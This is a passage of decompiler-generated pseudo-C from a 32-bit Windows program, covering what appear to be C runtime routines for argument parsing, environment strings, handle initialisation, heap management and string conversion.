		word32 dwArg04_123 = 0x01;
		uint32 ebx_124 = 0x00;
		byte bl_125 = 0x00;
		while (eax_119->b0000 == 0x5C)
		{
			ebx_124 = ebx_124 + 0x01;
			eax_119 = eax_119 + 0x01;
			bl_125 = (byte) ebx_124;
		}
		if (eax_119->b0000 == 0x22)
		{
			if ((bl_125 & 0x01) == 0x00)
			{
				if (dwArg14_116 != 0x00)
				{
					struct Eq_8560 * edx_281 = eax_119 + 0x01;
					if (eax_119[0x01] != 0x22)
						goto l0040A758;
					eax_119 = edx_281;
				}
				else
				{
l0040A758:
					dwArg04_123 = 0x00;
				}
				edi_109 = dwArg08;
				dwArg14_116 = (word32) (dwArg14_116 == 0x00);
			}
			ebx_124 = ebx_124 >> 0x01;
		}
		word32 ebx_148 = ebx_124 - 0x01;
		if (ebx_124 != 0x00)
		{
			word32 ebx_230 = ebx_148 + 0x01;
			do
			{
				if (esi_122 != null)
				{
					esi_122->unused = (int32) 0x5C;
					esi_122 = (Eq_2485) ((char *) &esi_122->unused + 0x01);
				}
				*dwArg14 = *dwArg14 + 0x01;
				ebx_230 = ebx_230 - 0x01;
			} while (ebx_230 != 0x00);
		}
		byte dl_156 = eax_119->b0000;
		if (dl_156 != 0x00 && (dwArg14_116 != 0x00 || dl_156 != 0x20 && dl_156 != 0x09))
		{
			if (dwArg04_123 != 0x00)
			{
				if (esi_122 != null)
				{
					if ((((word32) dl_156)->b494D61 & 0x04) != 0x00)
					{
						esi_122->unused = (int32) dl_156;
						*dwArg14 = *dwArg14 + 0x01;
						esi_122 = (Eq_2485) ((char *) &esi_122->unused + 0x01);
						eax_119 = eax_119 + 0x01;
					}
					esi_122->unused = (int32) eax_119->b0000;
					esi_122 = (Eq_2485) ((char *) &esi_122->unused + 0x01);
				}
				else if ((((word32) dl_156)->b494D61 & 0x04) != 0x00)
				{
					*dwArg14 = *dwArg14 + 0x01;
					eax_119 = eax_119 + 0x01;
				}
				*dwArg14 = *dwArg14 + 0x01;
			}
			eax_119 = eax_119 + 0x01;
			goto l0040A728;
		}
		if (esi_122 != null)
		{
			esi_122->unused = (int32) (esi_122->unused & 0x00);
			esi_122 = (Eq_2485) ((char *) &esi_122->unused + 0x01);
		}
		*dwArg14 = *dwArg14 + 0x01;
	}
	if (edi_109 != null)
		edi_109->unused = edi_109->unused & 0x00;
	*dwArg10 = *dwArg10 + 0x01;
}

// 0040A7F0: Register (ptr Eq_8279) fn0040A7F0(Register ui32 ecx)
Eq_8279 * fn0040A7F0(ui32 ecx)
{
	struct Eq_8279 * eax_124;
	word32 eax_8 = globals->dw493AA8;
	ptr32 esp_183 = fp - 0x18;
	struct Eq_8279 * ebx_118 = null;
	Eq_8966 bx_194 = 0x00;
	Eq_8968 esi_116 = 0x00;
	Eq_8970 edi_200 = 0x00;
	if (eax_8 == 0x00)
	{
		Eq_8968 eax_263 = GetEnvironmentStringsW();
		esi_116 = eax_263;
		if (eax_263 != 0x00)
		{
			globals->dw493AA8 = 0x01;
l0040A847:
			if (esi_116 != 0x00)
			{
l0040A857:
				Eq_8968 eax_174 = esi_116;
				if (*esi_116 != bx_194)
				{
					do
					{
						do
						{
							word32 eax_175 = eax_174 + 0x01;
							eax_174 = eax_175 + 0x01;
						} while (Mem0[eax_175 + 0x01:word16] != bx_194);
						eax_174 = eax_175 + 0x03;
					} while (Mem0[eax_175 + 0x03:word16] != bx_194);
				}
				struct Eq_9006 * esp_87 = esp_183 - 0x04;
				esp_87->t0000 = null;
				*(esp_87 - 0x04) = 0x00;
				*(esp_87 - 0x08) = 0x00;
				*(esp_87 - 0x0C) = 0x00;
				word32 eax_91 = (eax_174 - esi_116 >> 0x01) + 0x01;
				*(esp_87 - 0x10) = eax_91;
				*(esp_87 - 0x14) = (union Eq_8968 *) esi_116;
				*(esp_87 - 0x18) = 0x00;
				*(esp_87 - 0x1C) = 0x00;
				esp_87->dw0018 = eax_91;
				struct Eq_9062 * esp_102 = esp_87 - 0x1C;
				Eq_3320 eax_105 = WideCharToMultiByte(*(esp_87 - 0x1C), *(esp_87 - 0x18), *(esp_87 - 0x14), *(esp_87 - 0x10), *(esp_87 - 0x0C), *(esp_87 - 0x08), *(esp_87 - 0x04), esp_87->t0000);
				if (eax_105 != null)
				{
					*(esp_87 - 0x20) = (LPCH *) eax_105;
					word32 edi_130;
					struct Eq_8279 * eax_131 = fn00409613(eax_105, dwArg00, out ebx_118, out esi_116, out edi_130);
					*(esp_87 - 0x0C) = (struct Eq_8279 **) eax_131;
					esp_102 = esp_87 - 0x1C;
					if (eax_131 != ebx_118)
					{
						*(esp_87 - 0x20) = (struct Eq_8279 **) ebx_118;
						*(esp_87 - 0x24) = (struct Eq_8279 **) ebx_118;
						*(esp_87 - 0x28) = (LPCH *) eax_105;
						*(esp_87 - 44) = (struct Eq_8279 **) eax_131;
						*(esp_87 - 0x30) = *(esp_87 - 0x08);
						*(esp_87 - 0x34) = (union Eq_8968 *) esi_116;
						*(esp_87 - 0x38) = (struct Eq_8279 **) ebx_118;
						*(esp_87 - 0x3C) = (struct Eq_8279 **) ebx_118;
						if (WideCharToMultiByte(*(esp_87 - 0x3C), *(esp_87 - 0x38), *(esp_87 - 0x34), *(esp_87 - 0x30), *(esp_87 - 44), *(esp_87 - 0x28), *(esp_87 - 0x24), *(esp_87 - 0x20)) == null)
						{
							*(esp_87 - 0x40) = *(esp_87 - 44);
							word32 ebp_168;
							word32 edi_169;
							*(esp_87 - 44) = (union Eq_2 *) fn004095E4(eax_105, dwArg00, out ebp_168, out edi_169);
						}
						esp_102 = esp_183 - 0x40;
						ebx_118 = esp_102->ptr0010;
					}
				}
				union Eq_8968 * esp_121 = esp_102 - 0x04;
				*esp_121 = (union Eq_8968 *) esi_116;
				FreeEnvironmentStringsW(*esp_121);
				eax_124 = ebx_118;
				return eax_124;
			}
			Eq_8968 eax_185 = GetEnvironmentStringsW();
			esi_116 = eax_185;
			if (eax_185 != 0x00)
				goto l0040A857;
l0040A919:
			eax_124 = null;
			return eax_124;
		}
		Eq_8970 eax_268 = GetEnvironmentStrings();
		edi_200 = eax_268;
		if (eax_268 == 0x00)
			goto l0040A919;
		globals->dw493AA8 = 0x02;
	}
	else
	{
		if (eax_8 == 0x01)
			goto l0040A847;
		if (eax_8 != 0x02)
			goto l0040A919;
	}
	if (edi_200 == 0x00)
	{
		Eq_8970 eax_259 = GetEnvironmentStrings();
		edi_200 = eax_259;
		if (eax_259 == 0x00)
			goto l0040A919;
	}
	Eq_8970 eax_207 = edi_200;
	if (*edi_200 != 0x00)
	{
		do
		{
			do
				eax_207 = eax_207 + 0x01;
			while (*eax_207 != 0x00);
			eax_207 = eax_207 + 0x01;
		} while (Mem0[eax_207 + 0x01:byte] != 0x00);
	}
	struct Eq_8279 * esi_229;
	Eq_9281 eax_209 = eax_207 - edi_200;
	struct Eq_8279 * ebx_216;
	word32 esi_217;
	word32 edi_218;
	word32 eax_219 = fn00409613(eax_209 + 0x01, eax_209 + 0x01, out ebx_216, out esi_217, out edi_218);
	if (eax_219 == ebx_216)
		esi_229 = null;
	else
	{
		Mem240[fp - 0x1C + 0x00:word32] = eax_209 + 0x01;
		*(fp - 0x20) = edi_218;
		*(fp - 0x24) = (struct Eq_8279 **) eax_219;
		fn00407C00(dwArg00, dwArg04, dwArg08, out esi_229, out edi_218);
	}
	*(fp - 0x1C) = edi_218;
	FreeEnvironmentStringsA(*(fp - 0x1C));
	eax_124 = esi_229;
	return eax_124;
}

// 0040A922: Register (ptr Eq_8279) fn0040A922(Register Eq_3320 ebp)
Eq_8279 * fn0040A922(LPCH ebp)
{
	word32 ebx_18;
	word32 esi_19;
	Eq_2 edi_20;
	struct Eq_8279 * eax_21 = fn00409613(ebp, 0x0100, out ebx_18, out esi_19, out edi_20);
	struct Eq_8279 * esi_22 = eax_21;
	struct Eq_8279 * ecx_181 = *(fp - 88);
	if (eax_21 == null)
	{
		*(fp - 88) = 0x1B;
		word32 edi_293;
		fn0040854E(ebp, edi_20, out esi_22, out edi_293);
		ecx_181 = (struct Eq_8279 *) *(fp - 88);
	}
	globals->ptr494B20 = esi_22;
	globals->t494C20.u0 = 0x20;
	struct Eq_8279 * eax_39 = esi_22 + 0x0020;
	while (esi_22 < eax_39)
	{
		esi_22->b0004 = esi_22->b0004 & 0x00;
		esi_22->t0000.u0 = esi_22->t0000 | ~0x00;
		esi_22->b0005 = 0x0A;
		esi_22 = esi_22 + 0x01;
		eax_39 = globals->ptr494B20 + 0x0020;
	}
	*(fp - 88) = fp - 0x44;
	GetStartupInfoA(*(fp - 88));
	word32 * esp_118 = fp - 88;
	if (*(fp - 22) != 0x00)
	{
		union Eq_430 * eax_163 = *(fp - 0x14);
		if (eax_163 != null)
		{
			Eq_430 esi_167 = *eax_163;
			byte * ebp_168 = (char *) eax_163 + 0x04;
			word32 ebx_172 = esi_167 + (eax_163 + 0x04);
			if (esi_167 >= 0x0800)
				esi_167.u0 = 0x0800;
			if (globals->t494C20 < esi_167)
			{
				do
				{
					*(fp - 0x5C) = 0x0100;
					struct Eq_8279 ** edi_253;
					struct Eq_8279 * eax_254 = fn00409613((char *) eax_163 + 0x04, dwArg00, out ebx_172, out esi_167, out edi_253);
					ecx_181 = (struct Eq_8279 *) *(fp - 0x5C);
					if (eax_254 == null)
					{
						esi_167 = globals->t494C20;
						break;
					}
					globals->t494C20 = (word32) globals->t494C20 + 0x0020;
					*edi_253 = (struct Eq_8279 **) eax_254;
					ecx_181 = eax_254 + 0x0020;
					while (eax_254 < ecx_181)
					{
						eax_254->b0004 = eax_254->b0004 & 0x00;
						eax_254->t0000.u0 = eax_254->t0000 | ~0x00;
						eax_254->b0005 = 0x0A;
						eax_254 = eax_254 + 0x01;
						ecx_181 = (struct Eq_8279 *) ((char *) *edi_253 + 0x0100);
					}
				} while (globals->t494C20 < esi_167);
			}
			esp_118 = fp - 88;
			Eq_430 edi_186 = 0x00;
			if (esi_167 > 0x00)
			{
				do
				{
					word32 eax_199 = *ebx_172;
					if (eax_199 != ~0x00)
					{
						byte cl_215 = *ebp_168;
						ecx_181 = DPB(ecx_181, cl_215, 0);
						if ((cl_215 & 0x01) == 0x00)
							goto l0040AA49;
						if ((cl_215 & 0x08) == 0x00)
						{
							esp_118 = esp_118 - 0x04;
							*esp_118 = eax_199;
							if (GetFileType(*esp_118) != 0x00)
								goto l0040AA2B;
						}
						else
						{
l0040AA2B:
							struct Eq_9684 * eax_232 = (&globals->ptr494B20)[edi_186 >> 0x05] + (edi_186 & 0x1F) * 0x08;
							word32 ecx_233 = *ebx_172;
							eax_232->dw0000 = ecx_233;
							byte cl_235 = *ebp_168;
							eax_232->b0004 = cl_235;
							ecx_181 = DPB(ecx_233, cl_235, 0);
						}
					}
l0040AA49:
					edi_186 = (word32) edi_186.u0 + 0x01;
					ebp_168 = ebp_168 + 0x01;
					ebx_172 = ebx_172 + 0x01;
				} while (edi_186 < esi_167);
			}
		}
	}
	int32 ebx_72 = 0x00;
	do
	{
		struct Eq_8279 * eax_83 = globals->ptr494B20;
		struct Eq_9517 * esi_86 = eax_83 + ebx_72;
		if (eax_83[ebx_72] == ~0x00)
		{
			word32 eax_117;
			esi_86->b0004 = 0x81;
			if (ebx_72 == 0x00)
			{
				word32 * esp_148 = esp_118 - 0x04;
				*esp_148 = ~0x09;
				eax_117 = *esp_148;
			}
			else
				eax_117 = 0x00 - (0x01 - ebx_72 == 0x00) + ~0x0A;
			esp_118 = esp_118 - 0x04;
			*esp_118 = eax_117;
			Eq_2 eax_120 = GetStdHandle(*esp_118);
			if (eax_120 != ~0x00)
			{
				*(esp_118 - 0x04) = (union Eq_2 *) eax_120;
				esp_118 = esp_118 - 0x04;
				Eq_2 eax_134 = GetFileType(*(esp_118 - 0x04));
				if (eax_134 == 0x00)
					goto l0040AA9E;
				esi_86->t0000 = eax_120;
				if ((eax_134 & 0xFF) == 0x02)
					goto l0040AA9E;
				if ((eax_134 & 0xFF) == 0x03)
					esi_86->b0004 = esi_86->b0004 | 0x08;
			}
			else
			{
l0040AA9E:
				esi_86->b0004 = esi_86->b0004 | 0x40;
			}
		}
		else
			esi_86->b0004 = esi_86->b0004 | 0x80;
		ebx_72 = ebx_72 + 0x01;
	} while (ebx_72 < 0x03);
	union Eq_430 * esp_98 = esp_118 - 0x04;
	*esp_98 = (union Eq_430 *) globals->t494C20;
	SetHandleCount(*esp_98);
	return ecx_181;
}

// 0040AACD: Register word32 fn0040AACD(Stack word32 dwArg04)
word32 fn0040AACD(word32 dwArg04)
{
	Eq_2 eax_14 = HeapCreate((word32) (dwArg04 == 0x00), 0x1000, 0x00);
	globals->t494B04 = eax_14;
	if (eax_14 != 0x00)
	{
		if (fn0040B575() != 0x00)
		{
			*(fp - 0x10) = 0x01;
			return *(fp - 0x10);
		}
		*(fp - 0x10) = (union Eq_2 *) globals->t494B04;
		HeapDestroy(*(fp - 0x10));
	}
	return 0x00;
}

// 0040ACDC: Register Eq_2 fn0040ACDC(Register Eq_3320 ebp, Register Eq_2 edi)
Eq_2 fn0040ACDC(LPCH ebp, Eq_2 edi)
{
	word32 eax_3 = globals->dw493928;
	if (eax_3 == 0x01 || eax_3 == 0x00 && globals->dw412914 == 0x01)
	{
		Eq_2 edi_22;
		byte bl_23 = fn0040AD15(ebp, edi, 252, out edi_22);
		<anonymous> * eax_24 = globals->ptr493AAC;
		ptr32 esp_26 = fp;
		if (eax_24 != null)
		{
			word32 eax_46;
			byte SCZO_47;
			byte Z_48;
			byte SZO_49;
			byte C_50;
			word32 ecx_51;
			byte bl_54;
			eax_24();
		}
		*(esp_26 - 0x04) = 0xFF;
		fn0040AD15(ebp, edi_22, dwArg00, out edi);
	}
	return edi;
}

// 0040AD15: Register byte fn0040AD15(Register Eq_3320 ebp, Register Eq_2 edi, Stack Eq_2 dwArg04, Register out ptr32 ediOut)
byte fn0040AD15(LPCH ebp, Eq_2 edi, Eq_2 dwArg04, ptr32 & ediOut)
{
	*ediOut = edi;
	ui32 ecx_15 = 0x00;
	union Eq_2 * eax_12 = globals->a412CE8;
	while (dwArg04 != *eax_12)
	{
		eax_12 = (union Eq_2 *) ((char *) eax_12 + 0x08);
		ecx_15 = ecx_15 + 0x01;
		if (eax_12 >= &globals->t412D78)
			break;
	}
	struct Eq_9819 * esi_27 = ecx_15 << 0x03;
	if (dwArg04 == esi_27->t412CE8)
	{
		word32 eax_60 = globals->dw493928;
		if (eax_60 != 0x01 && (eax_60 != 0x00 || globals->dw412914 != 0x01))
		{
			if (dwArg04 != 252)
			{
				if (GetModuleFileNameA(null, fp - 424, 0x0104) == 0x00)
					edi = fn00407750(fp - 424);
				*(fp - 444) = (union Eq_2 *) edi;
				*(fp - 448) = fp - 424;
				if (fn00407840(dwArg00) > ~0x3A)
				{
					*(fp - 448) = fp - 424;
					Eq_2 eax_162 = fn00407840(dwArg00);
					*(fp - 0x01C4) = 0x03;
					*(fp - 0x01C8) = 0x0040D5B8;
					*(fp - 0x01CC) = (word32) eax_162 + (fp - 0x01E3);
					fn0040AFC0(dwArg00, dwArg04, dwArg08);
				}
				*(fp - 448) = 4248988;
				*(fp - 0x01C4) = fp - 0xA4;
				*(fp - 0x01C8) = (union Eq_2 *) fn00407750(dwArg00);
				*(fp - 0x01CC) = fp - 0xA4;
				fn00407760(dwArg00);
				*(fp - 464) = 4248984;
				*(fp - 0x01D4) = fp - 0xA4;
				fn00407760(dwArg00);
				*(fp - 0x01D8) = (union Eq_2 *) esi_27->t412CEC;
				*(fp - 0x01DC) = fp - 0xA4;
				fn00407760(dwArg00);
				*(fp - 0x01E0) = 0x00012010;
				*(fp - 484) = 4248944;
				*(fp - 488) = fp - 0xA4;
				bl = fn0040C098();
				word32 edi_157;
				*ediOut = *(fp - 444);
			}
		}
		else
			WriteFile(GetStdHandle(~0x0B), ~0x0B, esi_27->t412CEC, fn00407840(esi_27->t412CEC), fp + 0x04);
	}
	return bl;
}

// 0040AE68: Register Eq_181 fn0040AE68(Register ptr32 ebp, Stack word32 dwArg04, Stack Eq_2094 dwArg08, Stack word32 dwArg0C, Stack Eq_6624 dwArg10, Stack Eq_430 dwArg14, Stack Eq_2 dwArg18, Stack word32 dwArg1C)
BOOL fn0040AE68(ptr32 ebp, word32 dwArg04, Eq_2094 dwArg08, word32 dwArg0C, LPWORD dwArg10, Eq_430 dwArg14, Eq_2 dwArg18, word32 dwArg1C)
{
	Eq_181 eax_144;
	ptr32 eax_14 = fs->ptr0000;
	fs->ptr0000 = fp - 0x14;
	ptr32 esp_117 = fp - 0x38;
	word32 eax_114 = globals->dw493AB0;
	if (eax_114 == 0x00)
	{
		esp_117 = fp - 0x48;
		if (GetStringTypeW(0x01, &globals->t40D250, 0x01, fp - 0x20) != 0x00)
			eax_114 = 0x01;
		else
		{
			if (GetStringTypeA(0x00, 0x01, 4248140, 0x01, fp - 0x20) == 0x00)
				goto l0040AF9D;
			eax_114 = 0x02;
			esp_117 = fp - 0x5C;
		}
		globals->dw493AB0 = eax_114;
	}
	if (eax_114 == 0x02)
	{
		Eq_2 eax_121 = dwArg18;
		if (dwArg18 == 0x00)
			eax_121 = globals->t49393C;
		LPWORD * esp_128 = esp_117 - 0x04;
		*esp_128 = (LPWORD *) dwArg10;
		*(esp_128 - 0x04) = dwArg0C;
		*(esp_128 - 0x08) = (union Eq_2094 *) dwArg08;
		*(esp_128 - 0x0C) = dwArg04;
		*(esp_128 - 0x10) = (union Eq_2 *) eax_121;
		eax_144 = GetStringTypeA(*(esp_128 - 0x10), *(esp_128 - 0x0C), *(esp_128 - 0x08), *(esp_128 - 0x04), *esp_128);
l0040AF9F:
		fs->ptr0000 = eax_14;
		return eax_144;
	}
	if (eax_114 == 0x01)
	{
		if (dwArg14 == 0x00)
			dwArg14 = globals->t49394C;
		int32 * esp_156 = esp_117 - 0x04;
		*esp_156 = 0x00;
		*(esp_156 - 0x04) = 0x00;
		*(esp_156 - 0x08) = dwArg0C;
		*(esp_156 - 0x0C) = (union Eq_2094 *) dwArg08;
		*(esp_156 - 0x10) = (0x00 - (-dwArg1C == 0x00) & 0x08) + 0x01;
		*(esp_156 - 0x14) = (union Eq_430 *) dwArg14;
		int32 eax_178 = MultiByteToWideChar(*(esp_156 - 0x14), *(esp_156 - 0x10), *(esp_156 - 0x0C), *(esp_156 - 0x08), *(esp_156 - 0x04), *esp_156);
		if (eax_178 != 0x00)
		{
			word32 eax_186 = eax_178 * 0x02 + 0x03;
			fn00407F60(DPB(eax_186, (byte) eax_186 & 252, 0), ebp);
			*(esp_156 - 0x18) = eax_178 * 0x02;
			*(esp_156 - 0x1C) = 0x00;
			*(esp_156 - 0x20) = esp_156 - 0x14;
			fn004076F0(dwArg00, bArg04, dwArg08);
			if (esp_156 != (int32 *) 0x14)
			{
				*(esp_156 - 0x18) = eax_178;
				*(esp_156 - 0x1C) = esp_156 - 0x14;
				*(esp_156 - 0x20) = dwArg0C;
				*(esp_156 - 0x24) = (union Eq_2094 *) dwArg08;
				*(esp_156 - 0x28) = 0x01;
				*(esp_156 - 44) = (union Eq_430 *) dwArg14;
				int32 eax_226 = MultiByteToWideChar(*(esp_156 - 44), *(esp_156 - 0x28), *(esp_156 - 0x24), *(esp_156 - 0x20), *(esp_156 - 0x1C), *(esp_156 - 0x18));
				if (eax_226 != 0x00)
				{
					*(esp_156 - 0x30) = (LPWORD *) dwArg10;
					*(esp_156 - 0x34) = eax_226;
					*(esp_156 - 0x38) = esp_156 - 0x14;
					*(esp_156 - 0x3C) = dwArg04;
					eax_144 = GetStringTypeW(*(esp_156 - 0x3C), *(esp_156 - 0x38), *(esp_156 - 0x34), *(esp_156 - 0x30));
					goto l0040AF9F;
				}
			}
		}
	}
l0040AF9D:
	eax_144 = 0x00;
	goto l0040AF9F;
}

// 0040AFC0: Register (ptr (arr Eq_2)) fn0040AFC0(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack (ptr (arr Eq_2)) dwArg0C)
Eq_2 * fn0040AFC0[](Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 * dwArg0C[])
{
	Eq_2 (* ecx_117)[] = dwArg0C;
	if (dwArg0C == null)
		return ecx_117;
	byte al_100;
	Eq_2 (* ebx_103)[] = dwArg0C;
	Eq_2 esi_120 = dwArg08;
	Eq_2 edi_105 = dwArg04;
	if ((dwArg08 & 0x03) == 0x00)
	{
		ecx_117 = dwArg0C >> 0x02;
		if (dwArg0C >> 0x02 == 0x00)
			goto l0040B005;
	}
	else
	{
		do
		{
			al_100 = (byte) *esi_120;
			edi_105->u0 = al_100;
			esi_120 = (word32) esi_120 + 0x01;
			edi_105 = (word32) edi_105 + 0x01;
			ecx_117 = ecx_117 - 0x01;
			if (ecx_117 == null)
				return ecx_117;
			if (al_100 == 0x00)
			{
				if ((edi_105 & 0x03) != 0x00)
				{
					do
					{
						edi_105->u0 = al_100;
						edi_105 = (word32) edi_105 + 0x01;
						ecx_117 = ecx_117 - 0x01;
						if (ecx_117 == null)
							return ecx_117;
					} while ((edi_105 & 0x03) != 0x00);
				}
				ebx_103 = ecx_117;
				ecx_117 = ecx_117 >> 0x02;
				if (ecx_117 != null)
				{
l0040B0A7:
					do
					{
						*edi_105 = 0x00;
						edi_105 = (word32) edi_105 + 0x04;
						ecx_117 = ecx_117 - 0x01;
					} while (ecx_117 != null);
l0040B0B1:
					al_100 = 0x00;
					ebx_103 = ebx_103 & 0x03;
					if (ebx_103 == null)
						return ecx_117;
				}
				do
				{
					edi_105->u0 = al_100;
					edi_105 = (word32) edi_105 + 0x01;
l0040B03E:
					ebx_103 = ebx_103 - 0x01;
				} while (ebx_103 != null);
				return ecx_117;
			}
		} while ((esi_120 & 0x03) != 0x00);
		ebx_103 = ecx_117;
		ecx_117 = ecx_117 >> 0x02;
		if (ecx_117 >> 0x02 == 0x00)
		{
l0040B000:
			ebx_103 = ebx_103 & 0x03;
			if (ebx_103 == null)
				return ecx_117;
l0040B005:
			do
			{
				al_100 = (byte) *esi_120;
				edi_105->u0 = al_100;
				esi_120 = (word32) esi_120 + 0x01;
				edi_105 = (word32) edi_105 + 0x01;
				if (al_100 == 0x00)
					goto l0040B03E;
				ebx_103 = ebx_103 - 0x01;
			} while (ebx_103 != null);
			return ecx_117;
		}
	}
	do
	{
		Eq_10387 edx_210 = *esi_120;
		Eq_10391 eax_206 = *esi_120;
		byte dl_211 = (byte) edx_210;
		byte dh_212 = SLICE(edx_210, byte, 8);
		esi_120 = (word32) esi_120 + 0x04;
		if (((eax_206 ^ ~0x00 ^ (word32) eax_206 + 0x7EFEFEFF) & 0x81010100) != 0x00)
		{
			if (dl_211 != 0x00)
			{
				if (dh_212 != 0x00)
				{
					if ((edx_210 & 0x00FF0000) != 0x00)
					{
						if ((edx_210 & 0xFF000000) != 0x00)
							goto l0040B049;
						*edi_105 = edx_210;
					}
					else
						*edi_105 = edx_210 & 0xFFFF;
				}
				else
					*edi_105 = edx_210 & 0xFF;
			}
			else
				*edi_105 = 0x00;
			edi_105 = (word32) edi_105 + 0x04;
			ecx_117 = ecx_117 - 0x01;
			if (ecx_117 != null)
				goto l0040B0A7;
			goto l0040B0B1;
		}
l0040B049:
		*edi_105 = edx_210;
		edi_105 = (word32) edi_105 + 0x04;
		ecx_117 = ecx_117 - 0x01;
	} while (ecx_117 != null);
	goto l0040B000;
}

// 0040B575: Register Eq_2 fn0040B575()
Eq_2 fn0040B575()
{
	Eq_2 eax_10 = HeapAlloc(globals->t494B04, 0x00, 0x0140);
	globals->t493AE0 = eax_10;
	if (eax_10 != 0x00)
	{
		globals->t493AD8 = globals->t493AD8 & 0x00;
		globals->dw493ADC = globals->dw493ADC & 0x00;
		globals->t493AD4 = eax_10;
		globals->dw493ACC = 0x10;
		return 0x01;
	}
	else
		return eax_10;
}

// 0040B5B3: Register (ptr Eq_10558) fn0040B5B3(Stack Eq_2 dwArg04)
Eq_10558 * fn0040B5B3(Eq_2 dwArg04)
{
	struct Eq_10558 * eax_15 = (word32) globals->t493AE0 + 0x0C;
	struct Eq_10558 * ecx_6 = eax_15 + ((globals->dw493ADC * 0x05) * 0x04) / 0x0014;
	while (eax_15 < ecx_6)
	{
		if (dwArg04 - eax_15->dw0000 < 0x00100000)
			return eax_15;
		eax_15 = eax_15 + 0x01;
	}
	eax_15 = null;
	return eax_15;
}

// 0040B5DE: void fn0040B5DE(Register Eq_3320 ebp, Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack byte bArg0B)
void fn0040B5DE(LPCH ebp, Eq_2 dwArg04, Eq_2 dwArg08, byte bArg0B)
{
	Eq_2 dwArg08_356;
	int32 ebx_21 = *(dwArg08 - 0x04);
	Eq_10589 esi_20 = dwArg08 - *((word32) dwArg04 + 0x0C);
	Eq_10594 eax_18 = *((word32) dwArg04 + 0x0010);
	int32 ecx_35 = ebx_21 - 0x01 + ((word32) dwArg08 - 0x04);
	struct Eq_10605 * edx_22 = (word32) dwArg08 - 0x04;
	Eq_10607 esi_145 = esi_20 >> 0x0F;
	int32 edi_28 = *(dwArg08 - 0x08);
	int32 ebx_30 = ebx_21 - 0x01;
	word32 * ecx_32 = (word32) eax_18 + ((esi_20 >> 0x0F) *s 0x0204 + 0x0144);
	int32 dwLoc10_33 = ebx_21 - 0x01;
	dwArg08_356 = dwArg08;
	if (((byte) ecx_35 & 0x01) == 0x00)
	{
		Eq_2 ecx_446 = (ecx_35 >> 0x04) - 0x01;
		dwArg08_356 = ecx_446;
		if (ecx_446 > 0x3F)
			dwArg08_356.u0 = 0x3F;
		if (ebx_21 + 0x03 + ((word32) dwArg08 - 0x04) == (ebx_21 + 0x07) + ((word32) dwArg08 - 0x04))
		{
			byte cl_470 = (byte) dwArg08_356;
			if (dwArg08_356 < 0x20)
			{
				uint32 edi_476 = ~(0x80000000 >> cl_470);
				*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) & edi_476;
				word32 ecx_475 = dwArg08_356 + 0x04 + eax_18;
				Eq_10742 v17_481 = *ecx_475 - 0x01;
				*ecx_475 = v17_481;
				if (v17_481 == 0x00)
					*dwArg04 = *dwArg04 & edi_476;
			}
			else
			{
				word32 edi_496 = ~(0x80000000 >>u (byte) (dwArg08_356 + ~0x1F));
				*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) & edi_496;
				word32 ecx_495 = dwArg08_356 + 0x04 + eax_18;
				Eq_10742 v20_501 = *ecx_495 - 0x01;
				*ecx_495 = v20_501;
				if (v20_501 == 0x00)
					*((word32) dwArg04 + 0x04) = *((word32) dwArg04 + 0x04) & edi_496;
			}
		}
		*((char *) (ebx_21 + 0x07 + ((word32) dwArg08 - 0x04)) + 0x04) = ebx_21 + 0x03 + ((word32) dwArg08 - 0x04);
		*((char *) (ebx_21 + 0x03 + ((word32) dwArg08 - 0x04)) + 0x08) = ebx_21 + 0x07 + ((word32) dwArg08 - 0x04);
		ebx_30 = ebx_21 - 0x01 + ecx_35;
		dwLoc10_33 = ebx_30;
	}
	Eq_10632 edi_53 = ebx_30 >> 0x04;
	Eq_2 edi_364 = edi_53 - 0x01;
	if (edi_53 > 0x40)
		edi_364.u0 = 0x3F;
	if ((edi_28 & 0x01) == 0x00)
	{
		Eq_2 ecx_350 = (edi_28 >> 0x04) - 0x01;
		struct Eq_10605 * edx_344 = (word32) dwArg08 - 0x04 - edi_28;
		dwArg08_356 = ecx_350;
		if (ecx_350 > 0x3F)
		{
			dwArg08_356.u0 = 0x3F;
			ecx_350.u0 = 0x3F;
		}
		ebx_30 = ebx_30 + edi_28;
		dwLoc10_33 = ebx_30;
		edi_364 = (ebx_30 >> 0x04) - 0x01;
		if (edi_364 > 0x3F)
			edi_364.u0 = 0x3F;
		if (ecx_350 != edi_364)
		{
			if (edx_344->ptr0004 == edx_344->ptr0008)
			{
				byte cl_395 = (byte) dwArg08_356;
				if (dwArg08_356 < 0x20)
				{
					uint32 edx_401 = ~(0x80000000 >> cl_395);
					*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) & edx_401;
					word32 ecx_400 = dwArg08_356 + 0x04 + eax_18;
					Eq_10742 v23_406 = *ecx_400 - 0x01;
					*ecx_400 = v23_406;
					if (v23_406 == 0x00)
						*dwArg04 = *dwArg04 & edx_401;
				}
				else
				{
					word32 edx_421 = ~(0x80000000 >>u (byte) (dwArg08_356 + ~0x1F));
					*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) & edx_421;
					word32 ecx_420 = dwArg08_356 + 0x04 + eax_18;
					Eq_10742 v26_426 = *ecx_420 - 0x01;
					*ecx_420 = v26_426;
					if (v26_426 == 0x00)
						*((word32) dwArg04 + 0x04) = *((word32) dwArg04 + 0x04) & edx_421;
				}
			}
			edx_344->ptr0008->ptr0004 = edx_344->ptr0004;
			edx_344->ptr0004->ptr0008 = edx_344->ptr0008;
		}
		edx_22 = edx_344;
	}
	if ((edi_28 & 0x01) != 0x00 || dwArg08_356 != edi_364)
	{
		edx_22->ptr0004 = (ecx_32 + edi_364 * 0x08)[0x01];
		struct Eq_10605 * ecx_276 = ecx_32 + edi_364 * 0x08;
		edx_22->ptr0008 = ecx_276;
		ecx_276->ptr0004 = edx_22;
		edx_22->ptr0004->ptr0008 = edx_22;
		if (edx_22->ptr0004 == edx_22->ptr0008)
		{
			byte cl_285 = Mem280[edi_364 + 0x04 + eax_18:byte];
